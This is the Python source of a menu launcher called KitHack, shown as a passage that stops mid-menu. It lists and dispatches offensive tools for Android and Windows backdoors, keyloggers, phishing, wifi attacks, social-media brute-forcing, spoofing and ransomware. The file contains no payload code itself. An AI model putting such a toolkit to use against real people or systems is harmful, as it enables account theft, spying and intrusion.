#!/usr/bin/env python 
# -*- coding: utf-8 -*-
#Copyright 2019 KITHACK
#Written by: Adrian Guillermo
#Facebook: https://facebook.com/adrian.guillermo.22
#Github: https://github.com/AdrMXR

BLUE, RED, WHITE, CYAN, DEFAULT, YELLOW, MAGENTA, GREEN, END, BOLD = '\33[94m', '\033[91m', '\33[97m', '\033[36m', '\033[0m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m', '\033[1m'

import sys
import urllib 
import os 
import time
import Tkinter, Tkconstants, tkFileDialog
import argparse
from sys import exit 
from getch import pause 
from Tkinter import *
sys.path.insert(0,"lib")
import kitools
sys.dont_write_bytecode = True

def check(host='https://www.google.com'):
	print("{0}Verificando su conexion a internet...").format(GREEN)
	time.sleep(0.5)
	try:
		urllib.urlopen(host)
		print("{0}Conexion a internet exitosa.").format(GREEN)
		time.sleep(0.5)
		info()
	except:
		print("{0}[ERROR NETWORK]: Verifique su conexion a internet.").format(RED, GREEN)
		exit(0)

def info():
	os.system('clear')
	print("{0}[VERSION]:{1} 1.0\n\n").format(RED, DEFAULT)
	time.sleep(0.5)
	print("{0}[AUTOR]:{1} ADRIAN GUILLERMO\n\n").format(RED, DEFAULT)
	time.sleep(0.5)
	print("{0}[GITHUB]:{1} https://www.GitHub.com/AdrMXR\n\n").format(RED, DEFAULT)
	time.sleep(0.5)
	print("{0}[FACEBOOK]:{1} https://www.facebook.com/Adrian.Guillermo.22\n\n").format(RED, DEFAULT)
	time.sleep(0.5)
	print("{0}[INSTAGRAM]:{1} https://www.instagram.com/adrian.guillermo22\n\n").format(RED, DEFAULT)	
	time.sleep(0.5)
	print("{0}[YOUTUBE]:{1} https://www.youtube.com/channel/UCqEtxJKbIghx6lyymrjfvnA\n\n").format(RED, DEFAULT)
	time.sleep(5)
	os.system('clear')
	banner()

def banner():
	
	print '\n\n' 
	print '{} /$$   /$$ /$$$$$$ /$$$$$$$$       /$$   /$$  /$$$$$$   /$$$$$$  /$$   /$$ '.format(RED).center(93)
	print '{}| $$  /$$/|_  $$_/|__  $$__/      | $$  | $$ /$$__  $$ /$$__  $$| $$  /$$/ '.format(RED).center(93)		
	print '{}| $$ /$$/   | $$     | $$         | $$  | $$| $$  \ $$| $$  \__/| $$ /$$/  '.format(RED).center(93)
	print '{}| $$$$$/    | $$     | $$         | $$$$$$$$| $$$$$$$$| $$      | $$$$$/   '.format(RED).center(93)
	print '{}| $$  $$    | $$     | $$         | $$__  $$| $$__  $$| $$      | $$  $$   '.format(RED).center(93)
	print '{}| $$\  $$   | $$     | $$         | $$  | $$| $$  | $$| $$    $$| $$\  $$  '.format(RED).center(93)
	print '{}| $$ \  $$ /$$$$$$   | $$         | $$  | $$| $$  | $$|  $$$$$$/| $$ \  $$ '.format(RED).center(93)
	print '{}|__/  \__/|______/   |__/         |__/  |__/|__/  |__/ \______/ |__/  \__/ '.format(RED).center(93)
	print '{}                                                                      v1.0 by:AdrMXR'.format(BOLD)
                    														

def menu():
	print '\n'
	print '{0} ------------------------------------------------------------------------------------- '.format(DEFAULT)	
	print '{0}||                                        {1}MENU{0}                                       ||'.format(DEFAULT, WHITE)
	print '{0}||-----------------------------------------------------------------------------------||'.format(DEFAULT)
	print '{0}||                                         |                                         ||'.format(DEFAULT)
	print '{0}||          [01] {1}Android{0}                   |       [07] {1}Spoofing{0}                     ||'.format(DEFAULT, YELLOW)
	print '{0}||                                         |                                         ||'.format(DEFAULT)
	print '{0}||          [02] {1}Windows{0}                   |       [08] {1}Information Gathering{0}        ||'.format(DEFAULT, YELLOW)
	print '{0}||                                         |                                         ||'.format(DEFAULT)
	print '{0}||          [03] {1}Phishing{0}                  |       [09] {1}Others{0}                       ||'.format(DEFAULT, YELLOW)
	print '{0}||                                         |                                         ||'.format(DEFAULT)
	print '{0}||          [04] {1}Wifi Attacks{0}              |       [10] {1}Backdoors with msfvenom{0}      ||'.format(DEFAULT, YELLOW)
	print '{0}||                                         |                                         ||'.format(DEFAULT)
	print '{0}||          [05] {1}Passwords Attacks{0}         |       [11] {1}Help{0}                         ||'.format(DEFAULT, YELLOW)
	print '{0}||                                         |                                         ||'.format(DEFAULT)
	print '{0}||          [06] {1}Web Attacks{0}               |       [12] {1}Exit{0}                         ||'.format(DEFAULT, YELLOW)
	print '{0} ------------------------------------------------------------------------------------- '.format(DEFAULT)

def options():
	option = input("{0}KitHack >> {1}".format(RED, DEFAULT))
	if option == 1:
		os.system('clear')
		print '======={0}Tool{1}==================================={0}Information{1}================================'.format(GREEN, DEFAULT)
		print '{0}01){1} Backdoor-apk      {2}Agrega una puerta trasera a cualquier archivo APK.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}02){1} Evil-Droid        {2}Genera puertas traseras para Android.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}03){1} ApkTool           {2}Ingenieria inversa de aplicaciones Android.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}04){1} AhMyth            {2}Herramienta de administración remota de Android.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}05){1} Andspoilt         {2}Ejecuta exploits interactivos de Android en Linux.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}06){1} Kwetza            {2}Inyecta malware en aplicaciones android existentes.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}07){1} Termux            {2}Emulador de terminal Android basada en Linux.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}08){1} DroidTracker      {2}Genera una apk maliciosa para rastrear la ubicación en tiempo real.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}09){1} Droidcam          {2}Genera una apk maliciosa para tomar fotos desde la camara.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}10){1} Crydroid          {2}Android Crypter / Decrypter App Generator.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}11){1} KeyDroid          {2}Android Keylogger + Reverse Shell.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}12){1} Android-Exploits  {2}Coleccion de exploits y hacks Android.'.format(WHITE, YELLOW, DEFAULT)
		print '{0} 0){1} Back'.format(WHITE, YELLOW)

		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
		
		if tool == 0:
			os.system('clear')
			banner(), menu(), options()

		elif tool == 1:
			kitools.BackdoorApk()
		
		elif tool == 2:
			kitools.EvilDroid()
		
		elif tool == 3:
			kitools.ApkTool()
		
		elif tool == 4:
			kitools.AhMyth()

		elif tool == 5:
			kitools.Andspoilt()

		elif tool == 6:
			kitools.Kwetza()

		elif tool == 7:
			kitools.Termux()

		elif tool == 8:
			kitools.DroidTracker()

		elif tool == 9:
			kitools.Droidcam()

		elif tool == 10:
			kitools.Crydroid()

		elif tool == 11:
			kitools.KeyDroid()

		elif tool == 12:
			kitools.AndroidExploits()
		
		else:
			print("\n{}[X] OPCION INVALIDA".format(RED))
			time.sleep(1.5)
			os.system('clear')
			banner(), menu(), options()	

	elif option == 2:
		os.system('clear')
		print '========{0}Tool{1}================================================{0}Information{1}==================================='.format(GREEN, DEFAULT)
		print '{0}01){1} Winpayloads             {2}Generador de payloads indetectables en Windows.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}02){1} sAINT                   {2}Generador de spyware para sistemas Windows.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}03){1} BeeLogger               {2}Generador de Keyloggers gmail para Windows.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}04){1} FakeImageExploiter      {2}Inyecta malware en imagenes jpg para Windows.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}05){1} Koadic                  {2}Rootkit de Windows posterior a una explotacion.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}06){1} Phantom Evasion         {2}Herramienta de evasion de Antivirus.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}07){1} Ps1encode               {2}Generador y codificador de payloads basados en PowerShell.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}08){1} DKMC                    {2}Herramienta de evasion de carga maliciosa.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}09){1} Cromos                  {2}Inyecta codigo en extensiones legitimas de Chrome Web.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}10){1} Eternal_scanner         {2}Escáner para el exploit Eternal Blue y Eternal Romance.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}11){1} EternalblueDoublepulsar {2}Módulo de Metasploit para explotar la vulnerabilidad Eternalblue-Doublepulsar.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}12){1} EternalBlueWinXPWin10   {2}Modulo de Metasploit EternalBlue desde Windows XP SP2 hasta Windows 10 Pro.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}13){1} Spykey                  {2}Keylogger y Reverse Shell (cmd.exe).'.format(WHITE, YELLOW, DEFAULT)
		print '{0}14){1} Windows-Exploits        {2}Coleccion de Exploits Windows.'.format(WHITE, YELLOW, DEFAULT)
		print '{0} 0){1} Back'.format(WHITE, YELLOW)

		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
		
		if tool == 0:
			os.system('clear')
			banner(), menu(), options()

		elif tool == 1:
			kitools.Winpayloads()

		elif tool == 2:
			kitools.sAINT()

		elif tool == 3:
			kitools.BeeLogger()

		elif tool == 4:
			kitools.FakeImageExploiter()

		elif tool == 5:
			kitools.Koadic()

		elif tool == 6:
			kitools.PhantomEvasion()

		elif tool == 7:
			kitools.Ps1encode()

		elif tool == 8:
			kitools.DKMC()

		elif tool == 9:
			kitools.Cromos()

		elif tool == 10:
			kitools.EternalScanner()
		
		elif tool == 11:
			kitools.EternalblueDoublepulsarMetasploit()

		elif tool == 12:
			kitools.MS17010EternalBlueWinXPWin10()

		elif tool == 13:
			kitools.Spykey()

		elif tool == 14:
			kitools.WindowsExploits()

		else:
			print("\n{}[X] OPCION INVALIDA".format(RED))
			time.sleep(1.5)
			os.system('clear')
			banner(), menu(), options()			

	elif option == 3:
		os.system('clear')
		print '======={0}Tool{1}==============================={0}Information{1}============================='.format(GREEN, DEFAULT)
		print '{0}01){1} HiddenEye    {2}Herramienta de phishing moderna con funcionalidad avanzada.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}02){1} PhishX       {2}Generador de phishing y spoofing.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}03){1} SocialPhish  {2}Herramienta phishing con 32 plantillas + 1 personalizable.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}04){1} SocialFish   {2}Herramienta educativa de phishing.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}05){1} PhisherMan   {2}Herramienta phishing con 17 plantillas y funcional con ngrok.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}06){1} Shellphish   {2}Generador de phishing para 18 redes sociales.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}07){1} Spectre      {2}Admite ataques de phishing casi con cualquier sitio web.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}08){1} Blackeye     {2}Herramienta de phishing con 38 sitios web disponibles.'.format(WHITE, YELLOW, DEFAULT)		
		print '{0}09){1} PhEmail      {2}Automatiza procesos de envío de correos electrónicos de phishing.'.format(WHITE, YELLOW, DEFAULT)		
		print '{0}10){1} Weeman       {2}Servidor HTTP para phishing.'.format(WHITE, YELLOW, DEFAULT)				
		print '{0} 0){1} Back'.format(WHITE, YELLOW)

		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
		
		if tool == 0:
			os.system('clear')
			banner(), menu(), options()

		elif tool == 1:
			kitools.HiddenEye()

		elif tool == 2:
			kitools.PhishX()

		elif tool == 3:
			kitools.SocialPhish()

		elif tool == 4:
			kitools.SocialFish()

		elif tool == 5:
			kitools.PhisherMan()

		elif tool == 6:
			kitools.Shellphish()

		elif tool == 7:
			kitools.Spectre()

		elif tool == 8:
			kitools.Blackeye()

		elif tool == 9:
			kitools.PhEmail()

		elif tool == 10:
			kitools.Weeman()

		else:
			print("\n{}[X] OPCION INVALIDA".format(RED))
			time.sleep(1.5)
			os.system('clear')
			banner(), menu(), options()	

	elif option == 4:
		os.system('clear')
		print '======={0}Tool{1}====================================={0}Information{1}======================================'.format(GREEN, DEFAULT)
		print '{0}01){1} Fluxion        {2}herramienta de auditoría de redes e ingeniería social.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}02){1} Wifiphisher    {2}herramienta que permite capturar contraseñas wifi mediante AP.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}03){1} Wifibroot      {2}herramienta wifi Pentest Cracking para WPA/WPA2. '.format(WHITE, YELLOW, DEFAULT)
		print '{0}04){1} Wifite         {2}Ejecuta herramientas de auditoría inalámbrica existentes para usted.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}05){1} Ettercap       {2}Interceptor/sniffer/registrador para LANs con switch.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}06){1} Linset         {2}Herramienta de phishing WPA/WPA2.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}07){1} WiFi-Pumpkin   {2}Framework de AP para crear facilmente redes falsas.'.format(WHITE, YELLOW, DEFAULT)		
		print '{0}08){1} Wifresti       {2}Localiza tu contraseña de red inalámbrica en Windows, Linux y Mac OS.'.format(WHITE, YELLOW, DEFAULT)		
		print '{0}09){1} Evil Limiter   {2}Herramienta que limita el ancho de banda de los dispositivos.'.format(WHITE, YELLOW, DEFAULT)						
		print '{0}10){1} Netool-toolkit {2}Kit de herramientas de código abierto de pentesting de MitM.'.format(WHITE, YELLOW, DEFAULT)				
		print '{0}11){1} Dracnmap       {2}Herramienta que se utiliza para explotar redes y recopilar datos con nmap.'.format(WHITE, YELLOW, DEFAULT)				
		print '{0}12){1} Airgeddon      {2}Script en bash para auditar redes inalambricas.'.format(WHITE, YELLOW, DEFAULT)				
		print '{0}13){1} Routersploit   {2}Se compone de varios módulos que ayudan a operar pruebas de penetracion.'.format(WHITE, YELLOW, DEFAULT)				
		print '{0}14){1} Eaphammer      {2}Kit para realizar ataques dirigidos contra redes WPA2-Enterprise.'.format(WHITE, YELLOW, DEFAULT)				
		print '{0}15){1} VMR-MDK        {2}Script para descifrar redes inalámbricas WPS.'.format(WHITE, YELLOW, DEFAULT)				
		print '{0}16){1} FakeAP         {2}Acces point falso para realizar Evil Twin Attack.'.format(WHITE, YELLOW, DEFAULT)						
		print '{0}17){1} Wirespy        {2}Permite configurar honeypots rápidos para llevar a cabo MITMA.'.format(WHITE, YELLOW, DEFAULT)						
		print '{0}18){1} Wireshark      {2}Analizador de redes que te permite capturar y navegar en el trafico de una red.'.format(WHITE, YELLOW, DEFAULT)						
		print '{0}19){1} SniffAir       {2}Framework para pentesting inalámbrico.'.format(WHITE, YELLOW, DEFAULT)						
		print '{0}20){1} WifiJammer     {2}Atasca continuamente todos los clientes / enrutadores wifi.'.format(WHITE, YELLOW, DEFAULT)						
		print '{0} 0){1} Back'.format(WHITE, YELLOW)

		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT)) 
		
		if tool == 0:
			os.system('clear')
			banner(), menu(), options()

		elif tool == 1:
			kitools.Fluxion()

		elif tool == 2:
			kitools.Wifiphisher()

		elif tool == 3:
			kitools.Wifibroot()

		elif tool == 4:
			kitools.Wifite()

		elif tool == 5:
			kitools.Ettercap()

		elif tool == 6:
			kitools.Linset()

		elif tool == 7:
			kitools.WiFiPumpkin()

		elif tool == 8:
			kitools.Wifresti()

		elif tool == 9:
			kitools.EvilLimiter()

		elif tool == 10:
			kitools.NetoolToolkit()

		elif tool == 11:
			kitools.Dracnmap()

		elif tool == 12:
			kitools.Airgeddon()

		elif tool == 13:
			kitools.Routersploit()

		elif tool == 14:
			kitools.Eaphammer()

		elif tool == 15:
			kitools.VMRMDK()

		elif tool == 16:
			kitools.FakeAP()

		elif tool == 17:
			kitools.Wirespy()

		elif tool == 18:
			kitools.Wireshark()

		elif tool == 19:
			kitools.SniffAir()

		elif tool == 20:
			kitools.WifiJammer()

		else:
			print("\n{}[X] OPCION INVALIDA".format(RED))
			time.sleep(1.5)
			os.system('clear')
			banner(), menu(), options()	

	elif option == 5:
		os.system('clear')
		print '======={0}Tool{1}====================================={0}Information{1}================================'.format(GREEN, DEFAULT)
		print '{0}01){1} Cupp            {2}Permite crear diccionarios específicamente para una persona.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}02){1} Facebooker      {2}Script en perl que realiza fuerza bruta contra Facebook.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}03){1} InstaInsane     {2}Realiza fuerza bruta contra instagram a 1000 contraseñas/min.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}04){1} BluForce-FB     {2}Ataques de fuerza bruta en cuentas de Facebook.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}05){1} Brut3k1t        {2}Ataques de fuerza bruta contra una multitud de protocolos y servicios.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}06){1} SocialBox       {2}Framework de fuerza bruta [Facebook, Gmail, Instagram, Twitter].'.format(WHITE, YELLOW, DEFAULT)
		print '{0}07){1} Crunch          {2}herramienta de permutacion el cual nos ayuda a crear diccionarios.'.format(WHITE, YELLOW, DEFAULT)		
		print '{0}08){1} John The Ripper {2}Programa que aplica fuerza bruta para descifrar contraseñas.'.format(WHITE, YELLOW, DEFAULT)		
		print '{0}09){1} Hashcat         {2}Herramienta para la recuperación de contraseñas.'.format(WHITE, YELLOW, DEFAULT)				
		print '{0}10){1} Brutedum        {2}Ataca SSH, FTP, Telnet, PostgreSQL, RDP, VNC con Hydra, Medusa y Ncrack.'.format(WHITE, YELLOW, DEFAULT)				
		print '{0} 0){1} Back'.format(WHITE, YELLOW)

		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
		
		if tool == 0:
			os.system('clear')
			banner(), menu(), options()

		elif tool == 1:
			kitools.Cupp()

		elif tool == 2:
			kitools.Facebooker()

		elif tool == 3:
			kitools.InstaInsane()

		elif tool == 4:
			kitools.BluForceFB()

		elif tool == 5:
			kitools.Brut3k1t()

		elif tool == 6:
			kitools.SocialBox()

		elif tool == 7:
			kitools.Crunch()

		elif tool == 8:
			kitools.JohnTheRipper()

		elif tool == 9:
			kitools.Hashcat()

		elif tool == 10:
			kitools.Brutedum()

		else:
			print("\n{}[X] OPCION INVALIDA".format(RED))
			time.sleep(1.5)
			os.system('clear')
			banner(), menu(), options()	

	elif option == 6:
		os.system('clear')
		print '======={0}Tool{1}========================================={0}Information{1}========================================'.format(GREEN, DEFAULT)
		print '{0}01){1} SQLmap       {2}Inyección SQL y toma de control de los servidores de bases de datos.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}02){1} XAttacker    {2}Escáner de vulnerabilidades de sitios web.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}03){1} Fuxploider   {2}Detecta técnicas favorables para cargar shells web o cualquier archivo malicioso.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}04){1} Wordpresscan {2}Escáner de WordPress de vulnerabilidades.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}05){1} SiteBroker   {2}Recopila información y automatiza pruebas de penetración en sitios web.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}06){1} NoSQLMap     {2}Explotacion de debilidades de configuración predeterminadas en bases de datos NoSQL.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}07){1} Sqli-scanner {2}Escanear de sitios web vulnerables a la inyección de SQL destinado a una lista de URL.'.format(WHITE, YELLOW, DEFAULT)		
		print '{0}08){1} Joomscan     {2}Permite escanear sitios web y detectar configuraciones erroneas o deficiencias.'.format(WHITE, YELLOW, DEFAULT)					
		print '{0}09){1} Metagoofil   {2}Extractor de metadatos de documentos públicos (pdf, doc, xls, ppt, etc.).'.format(WHITE, YELLOW, DEFAULT)					
		print '{0}10){1} Sublist3r    {2}Herramienta rápida de enumeración de subdominios para probadores de penetración.'.format(WHITE, YELLOW, DEFAULT)					
		print '{0}11){1} WAFNinja     {2}Programa que contiene dos funciones para atacar firewalls de aplicaciones web.'.format(WHITE, YELLOW, DEFAULT)					
		print '{0}12){1} Dirsearch    {2}Diseñada para directorios y archivos de fuerza bruta en sitios web.'.format(WHITE, YELLOW, DEFAULT)					
		print '{0}13){1} XSStrike     {2}El escáner XSS más avanzado.'.format(WHITE, YELLOW, DEFAULT)					
		print '{0}14){1} LinksF1nd3r  {2}Extractor de componentes web.'.format(WHITE, YELLOW, DEFAULT)					
		print '{0} 0){1} Back'.format(WHITE, YELLOW)

		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
		
		if tool == 0:
			os.system('clear')
			banner(), menu(), options()

		elif tool == 1:
			kitools.SQLmap()

		elif tool == 2:
			kitools.XAttacker()

		elif tool == 3:
			kitools.Fuxploider()

		elif tool == 4:
			kitools.Wordpresscan()

		elif tool == 5:
			kitools.SiteBroker()

		elif tool == 6:
			kitools.NoSQLMap()

		elif tool == 7:
			kitools.SqliScanner()

		elif tool == 8:
			kitools.Joomscan()

		elif tool == 9:
			kitools.Metagoofil()

		elif tool == 10:
			kitools.Sublist3r()

		elif tool == 11:
			kitools.WAFNinja()

		elif tool == 12:
			kitools.Dirsearch()

		elif tool == 13:
			kitools.XSStrike()

		elif tool == 14:
			kitools.LinksF1nd3r()

		else:
			print("\n{}[X] OPCION INVALIDA".format(RED))
			time.sleep(1.5)
			os.system('clear')
			banner(), menu(), options()		

	elif option == 7:
		os.system('clear')
		print '======={0}Tool{1}====================================={0}Information{1}=================================='.format(GREEN, DEFAULT)
		print '{0}01){1} SpoofMAC      {2}Permite modificar su direccion MAC para depurar.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}02){1} Ip_spoofing   {2}ARP spoofing, HTTP spoofing && Dos.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}03){1} Arpspoof      {2}Ataque de falsificación de ARP utilizando sockets del kernel de Linux.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}04){1} DerpNSpoof    {2}Herramienta de suplantación de DNS simple.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}05){1} Email-spoof   {2}Email Spoofing a traves de una consola bash y un servidor http.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}06){1} DrSpoof       {2}Herramienta para detectar y detener ataques ARP Spoofing en su red local.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}07){1} Smslistattack {2}Programa para anonimizar textos de spam, objetivos o listas de objetivos.'.format(WHITE, YELLOW, DEFAULT)
		print '{0} 0){1} Back'.format(WHITE, YELLOW)

		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
		
		if tool == 0:
			os.system('clear')
			banner(), menu(), options()

		elif tool == 1:
			kitools.SpoofMAC()

		elif tool == 2:
			kitools.IpSpoofing()

		elif tool == 3:
			kitools.Arpspoof()

		elif tool == 4:
			kitools.DerpNSpoof()

		elif tool == 5:
			kitools.EmailSpoof()

		elif tool == 6:
			kitools.DrSpoof()

		elif tool == 7:
			kitools.Smslistattack()

		else:
			print("\n{}[X] OPCION INVALIDA".format(RED))
			time.sleep(1.5)
			os.system('clear')
			banner(), menu(), options()		

	elif option == 8:
		os.system('clear')
		print '========{0}Tool{1}========================================{0}Information{1}========================================'.format(GREEN, DEFAULT)
		print '{0}01){1} NMAP          {2}Obtiene información de los host, puertos y servicios dentro de una red.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}02){1} Th3inspector  {2}Herramienta todo en uno para recopilar información.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}03){1} FBI           {2}Recopilación de información confidencial en cuentas de Facebook.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}04){1} Infoga        {2}Extrae información de cuentas de correo electrónico.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}05){1} Crips         {2}Obtiene información sobre direcciones IP, paginas web y registros DNS.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}06){1} BillCipher    {2}Recopilación de información para un sitio web o direccion IP.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}07){1} RED_HAWK      {2}Herramienta para recopilar información, escanear vulnerabilidades y rastreo.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}08){1} Recon-ng      {2}Herramienta precargada con gran cantidad de modulos para recopilar información.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}09){1} theHarvester  {2}Recopilación de correos electrónicos, nombres, subdominios, direcciones IP y URL.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}10){1} PhoneInfoga   {2}Obtiene información sobre numeros de telefono utilizando recursos gratuitos.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}11){1} Gasmask       {2}Herramienta de recopilación de información todo en uno.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}12){1} Infog         {2}Shellscript para realizar recopilación de información.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}13){1} Locator       {2}Geolocalizador, ip tracker e información del dispositivo por URL (Serveo y Ngrok).'.format(WHITE, YELLOW, DEFAULT)
		print '{0}14){1} Userrecon     {2}Localiza nombres de usuario en mas de 75 redes sociales.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}15){1} Excuseme      {2}Obtiene dirección IP e información del dispositivo por URL.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}16){1} URLextractor  {2}Recopilación de información y reconocimiento de sitios web.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}17){1} Devploit      {2}Busqueda de DNS, Whois, IP, GeoIP, subred, puertos, host, etc.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}18){1} ReconDog      {2}Herramienta todo en uno para recopilar información básica.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}19){1} Webkiller     {2}Kit de recopilación de información.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}20){1} Quasar        {2}Framework de recopilación de información.'.format(WHITE, YELLOW, DEFAULT)
		print '{0} 0){1} Back'.format(WHITE, YELLOW)

		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
		
		if tool == 0:
			os.system('clear')
			banner(), menu(), options()

		elif tool == 1:
			kitools.NMAP()

		elif tool == 2:
			kitools.Th3inspector()

		elif tool == 3:
			kitools.FBI()

		elif tool == 4:
			kitools.Infoga()

		elif tool == 5:
			kitools.Crips()

		elif tool == 6:
			kitools.BillCipher()

		elif tool == 7:
			kitools.RedHawk()

		elif tool == 8:
			kitools.ReconNg()
		
		elif tool == 9:
			kitools.theHarvester()

		elif tool == 10:
			kitools.PhoneInfoga()

		elif tool == 11:
			kitools.Gasmask()

		elif tool == 12:
			kitools.Infog()

		elif tool == 13:
			kitools.Locator()

		elif tool == 14:
			kitools.Userrecon()

		elif tool == 15:
			kitools.Excuseme()

		elif tool == 16:
			kitools.URLextractor()

		elif tool == 17:
			kitools.Devploit()

		elif tool == 18:
			kitools.ReconDog()

		elif tool == 19:
			kitools.Webkiller()

		elif tool == 20:
			kitools.Quasar()

		else:
			print("\n{}[X] OPCION INVALIDA".format(RED))
			time.sleep(1.5)
			os.system('clear')
			banner(), menu(), options()			

	elif option == 9:
		os.system('clear')
		print '======{0}Tool{1}===================================================={0}Information{1}======================================='.format(GREEN, DEFAULT)
		print '{0}01){1} TheFatRat               {2}Herramienta que compila malware para ejecutar en Linux, Windows, Mac y Android.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}02){1} Msfpc                   {2}Contenedor para generar múltiples cargas útiles, según la elección de los usuarios.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}03){1} Fcrackzip               {2}Script para descifrar archivos ZIP encriptados por contraseña.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}04){1} QRLjacker               {2}Vector de ataque capaz de secuestrar sesiones que dependen de algun codigo QR.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}05){1} Lazy                    {2}Script que automatiza muchos procesos de penetracion.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}06){1} BlueThunderIPLocator    {2}Proporciona información sobre una direccion IP o HOST.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}07){1} HTBINVITE               {2}Generador de codigos de invitacion para HackTheBox.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}08){1} Ngrok                   {2}Proxy inverso que crea un túnel seguro desde un punto público a un servicio local.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}09){1} TheChoice               {2}Colección de 14 herramientas de hackers.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}10){1} Ransomware              {2}Herramienta que encripta los archivos de un directorio especifico en Linux.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}11){1} Bluepot                 {2}Honeypot Bluetooth escrito en Java.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}12){1} Setoolkit               {2}Marco de prueba de penetración de código abierto diseñado para la ingeniería social.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}13){1} A2sv                    {2}Vulnerabilidad de escaneo automático a SSL.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}14){1} 4nonimizer              {2}Anonimiza la IP pública utilizada para navegar por Internet mediante proveedores VPN.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}15){1} Saycheese               {2}Captura fotos de la cámara web del objetivo por medio de un enlace.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}16){1} Easysploit              {2}Automatización de Metasploit.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}17){1} NXcrypt                 {2}Inyección de malware en archivos con formato python.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}18){1} KnockMail               {2}Verifica si existe un correo electronico'.format(WHITE, YELLOW, DEFAULT)
		print '{0}19){1} RkHunter                {2}Herramienta de Unix que detecta los rootkits, puertas traseras y exploits locales.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}20){1} HeraKeylogger           {2}Chrome Keylogger Extension.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}21){1} ZLogger                 {2}Keylogger remoto persistente para Windows y Linux.'.format(WHITE, YELLOW, DEFAULT)
		print '{0}22){1} Xerosploit              {2}Kit de herramientas de pruebas de penetración.'.format(WHITE, YELLOW, DEFAULT)
